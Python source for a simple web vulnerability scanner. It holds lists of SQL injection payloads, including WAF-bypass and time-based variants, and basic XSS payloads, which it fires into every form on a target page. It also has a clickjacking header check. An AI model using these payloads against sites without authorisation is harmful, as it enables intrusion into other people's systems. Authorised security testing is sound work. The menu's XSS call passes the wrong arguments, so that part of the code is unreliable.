import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from crawler import crawl
import time

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.140 Mobile Safari/537.36"
}


sqli_payloads = {
    "basic": [
        "' OR '1'='1 --",
        "\" OR \"1\"=\"1 --",
        "' OR 1=1 --",
        "' OR ''=' --",
        "' OR 1=1#",
        "' OR 1=1/*"
    ],

    "error_based": [
        "' AND 1=CONVERT(int, (SELECT @@version))--",   # MSSQL
        "' AND extractvalue(1, concat(0x7e, version()))--",  # MySQL
        "' AND updatexml(null, concat(0x3a, version()), null)--",  # MySQL
        "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a)--",
        "' AND (SELECT @@version) = 1 --",
        "' OR 1=CAST((SELECT version()) AS INT)--"
    ],

    "boolean_based": [
        "' AND 1=1 --",            # Always true
        "' AND 1=2 --",            # Always false
        "' AND 'a'='a' --",
        "' AND 'a'='b' --",
        "\" AND 1=1 --",
        "\" AND 1=2 --"
    ],

    "time_based": [
        "' OR SLEEP(5)--",                                 # MySQL
        "' OR pg_sleep(5)--",                              # PostgreSQL
        "'; WAITFOR DELAY '0:0:5'--",                      # MSSQL
        "' OR dbms_pipe.receive_message('a',5) FROM dual--",  # Oracle
        "' AND IF(1=1, SLEEP(5), 0)--",
        "' || pg_sleep(5)--"
    ],

    "waf_bypass": [
        "'/*!50000OR*/1=1--",              # WAF bypass with SQL comments
        "' OR 1=1--+",                     # Encoded space variant
        "' OR 1=1-- -",                    # Double space
        "' OR 1=1 and ''='",              # Logical trick
        "' oorr 1=1--",                   # Misspelled 'or' (basic filter bypass)
        "' OR true--",                    # Boolean trick
        "' OR 'x'='x--"
    ],

    "encoded": [
        "%27%20OR%201=1--",
        "%27%20OR%20%271%27=%271--",
        "%27%20OR%20%27a%27=%27a--",
        "%22%20OR%20%221%22=%221--",
        "%27)%20OR%20(%271%27=%271--"
    ],

    "db_version": [
        "' UNION SELECT null, @@version--",         # MySQL
        "' UNION SELECT version(), null--",         # PostgreSQL
        "' UNION SELECT NULL, banner FROM v$version--",  # Oracle
        "' UNION ALL SELECT NULL, @@version--",
        "' UNION SELECT @@version, NULL--"
    ]
}



xss_payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "';alert(String.fromCharCode(88,83,83));//",
    "<img src=x onerror=alert('XSS')>", 
]

class Request:
    def traffic_interception(self, response):
        print(f"\nIntercepting traffic from: {response.url}")
        print(f"Status: {response.status_code} {response.reason}")
        print("\nHeaders:")
        for k, v in response.headers.items():
            print(f"{k}: {v}")
        print("\nBody preview (first 500 chars):")
        print(response.text[:500])

    def clickjacking(self, response):
        print("\n[Clickjacking Check]")
        x_frame = response.headers.get("X-Frame-Options")
        csp = response.headers.get("Content-Security-Policy")
        if not x_frame:
            print("❗ No X-Frame-Options — Possible Clickjacking!")
        if not csp or "frame-ancestors" not in csp:
            print("❗ Weak CSP or missing frame-ancestors — Possible Clickjacking!")
        print("✅ Headers:")
        print(f"X-Frame-Options: {x_frame or 'None'}")
        print(f"Content-Security-Policy: {csp or 'None'}")

class SQLI:
    def getting_inputs(self, url):
        res = requests.get(url)
        soup = BeautifulSoup(res.text, "html.parser")
        forms = []
        for form in soup.find_all("form"):
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = []
            for tag in form.find_all("input"):
                name = tag.get("name")
                if name:
                    inputs.append({"name": name})
            forms.append({"action": action, "method": method, "inputs": inputs})
        return forms

    def basic_check(self, response, form, payload):
        url = urljoin(response.url, form["action"])
        data = {i["name"]: payload for i in form["inputs"]}
        res = self._send(form["method"], url, data)
        if not res or res.status_code != 200:
            return {"vulnerable": False}

        errors = ["sql syntax", "unclosed quotation", "unknown column", "sqlstate", "syntax error", "mysql_fetch"]
        if any(e in res.text.lower() for e in errors):
            return {"vulnerable": True, "url": url, "payload": payload}
        return {"vulnerable": False}

    def time_based_check(self, response, form, payload):
        url = urljoin(response.url, form["action"])
        data = {i["name"]: payload for i in form["inputs"]}
        start = time.time()
        res = self._send(form["method"], url, data)
        end = time.time()
        if res and res.status_code == 200 and (end - start) > 4.5:
            return {"vulnerable": True, "url": url, "delay": round(end - start, 2)}
        return {"vulnerable": False}

    def boolean_check(self, response, form, true_payload, false_payload):
        url = urljoin(response.url, form["action"])
        inputs = {i["name"]: true_payload for i in form["inputs"]}
        res_true = self._send(form["method"], url, inputs)
        inputs = {i["name"]: false_payload for i in form["inputs"]}
        res_false = self._send(form["method"], url, inputs)
        if res_true and res_false and res_true.status_code == 200 and res_false.status_code == 200:
            if abs(len(res_true.text) - len(res_false.text)) > 30:
                return {"vulnerable": True, "url": url}
        return {"vulnerable": False}

    def _send(self, method, url, data):
        try:
            return requests.post(url, data=data) if method == "post" else requests.get(url, params=data)
        except:
            return None

def print_sqli_result(res):
    print("\n\033[91m[🔥 SQL INJECTION DETECTED]\033[0m")
    print(f"🔗 URL           : {res['url']}")
    print(f"📍 Form action   : {res.get('form_action')}")
    print(f"📨 Method        : {res.get('form_method')}")
    print(f"✏️  Inputs        : {', '.join(res['inputs'])}")

    if res['type'] == "boolean":
        print(f"🧪 True payload   : {res['true_payload']}")
        print(f"🧪 False payload  : {res['false_payload']}")
    elif res['type'] == "time-based":
        print(f"🧪 Payload        : {res['payload']}")
        print(f"⏱️ Delay observed : {res['delay']}s")
    else:
        print(f"🧪 Payload        : {res['payload']}")
    print("-" * 60)

def run_sqli_scanner(response):
    sqli = SQLI()
    forms = sqli.getting_inputs(response.url)
    if not forms:
        print("\033[93m[!] No forms found on the page.\033[0m")
        return

    for form in forms:
        print(f"\n\033[94m[🔍 Scanning form at action: {form['action']}]\033[0m")

        for cat in ["basic", "error_based", "encoded", "waf_bypass", "db_version"]:
            for payload in sqli_payloads.get(cat, []):
                res = sqli.basic_check(response, form, payload)
                if res["vulnerable"]:
                    res.update({
                        "form_action": form.get("action"),
                        "form_method": form.get("method"),
                        "inputs": [i["name"] for i in form["inputs"]],
                        "type": "basic"
                    })
                    print_sqli_result(res)

        for payload in sqli_payloads["boolean_based"]:
            false_payload = payload.replace("1=1", "1=2").replace("'a'='a'", "'a'='b'")
            res = sqli.boolean_check(response, form, payload, false_payload)
            if res["vulnerable"]:
                res.update({
                    "form_action": form.get("action"),
                    "form_method": form.get("method"),
                    "inputs": [i["name"] for i in form["inputs"]],
                    "type": "boolean",
                    "true_payload": payload,
                    "false_payload": false_payload
                })
                print_sqli_result(res)
        time_based_check = input('Wanna do time based sqli check ? (y/n): ').strip().lower()
        if time_based_check == 'y':
         for payload in sqli_payloads["time_based"]:
            res = sqli.time_based_check(response, form, payload)
            if res["vulnerable"]:
                res.update({
                    "form_action": form.get("action"),
                    "form_method": form.get("method"),
                    "inputs": [i["name"] for i in form["inputs"]],
                    "type": "time-based",
                    "payload": payload
                })
                print_sqli_result(res)
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

class XSS:
    def getting_inputs(self, url):
        res = requests.get(url)
        soup = BeautifulSoup(res.text, "html.parser")
        forms = []
        for form in soup.find_all("form"):
            action = form.get("action") or url  # Default to current URL if no action
            method = form.get("method", "get").lower()
            inputs = []
            for tag in form.find_all(["input", "textarea"]):  # Also check textareas
                input_type = tag.get("type", "text")
                name = tag.get("name")
                value = tag.get("value", "")
                if name and input_type not in ["submit", "button", "reset"]:
                    inputs.append({"name": name, "value": value})
            forms.append({"action": action, "method": method, "inputs": inputs})
        return forms

    def _send(self, method, url, data):
        try:
            if method == "post":
                return requests.post(url, data=data)
            else:
                return requests.get(url, params=data)
        except Exception as e:
            print(f"[!] Request failed: {e}")
            return None

    def check_reflection(self, base_url, form, payload):
        url = urljoin(base_url, form["action"])
        data = {}
        for i in form["inputs"]:
            data[i["name"]] = payload if not i["value"] else i["value"] + payload

        res = self._send(form["method"], url, data)
        if not res or res.status_code != 200:
            return {"vulnerable": False}

        if payload in res.text:
            return {
                "vulnerable": True,
                "url": url,
                "payload": payload,
                "form_action": form.get("action"),
                "form_method": form.get("method"),
                "inputs": [i["name"] for i in form["inputs"]]
            }

        return {"vulnerable": False}

def run_xss_scanner(url, xss_payloads):
    xss = XSS()
    forms = xss.getting_inputs(url)
    if not forms:
        print("No forms found.")
        return

    for form in forms:
        print(f"\nScanning form at action: {form['action']}")
        for payload in xss_payloads:
            res = xss.check_reflection(url, form, payload)
            if res["vulnerable"]:
                print("\n[🚨 XSS VULNERABILITY DETECTED!]")
                print(f"📍 Form action: {res['form_action']}")
                print(f"📨 Method: {res['form_method']}")
                print(f"🧪 Payload used: {res['payload']}")
                print(f"✏️  Input fields: {', '.join(res['inputs'])}")
                print(f"🔗 Full URL: {res['url']}")

def choosing_menu(request_obj, response, url, wordlist):
    vulnerabilities = {
        "SQL Injection": "sqli",
        "Clickjacking": "cj",
        "XSS": "xss",
        "Crawling": "crawl"
    }

    print("\nAvailable vulnerabilities:")
    for key, value in vulnerabilities.items():
        print(f"- {key} : {value}")

    menu = input("Choose vulnerability by code: ").lower()

    func_map = {
        "sqli": lambda resp: run_sqli_scanner(resp),
        "cj": lambda resp: request_obj.clickjacking(resp),
        "xss": lambda resp: run_xss_scanner(resp),
        "crawl": lambda resp=None: crawl(url, wordlist, request_obj, run_sqli_scanner, run_xss_scanner)
    }

    func = func_map.get(menu)
    if func:
        func(response)
    else:
        print("Invalid choice")

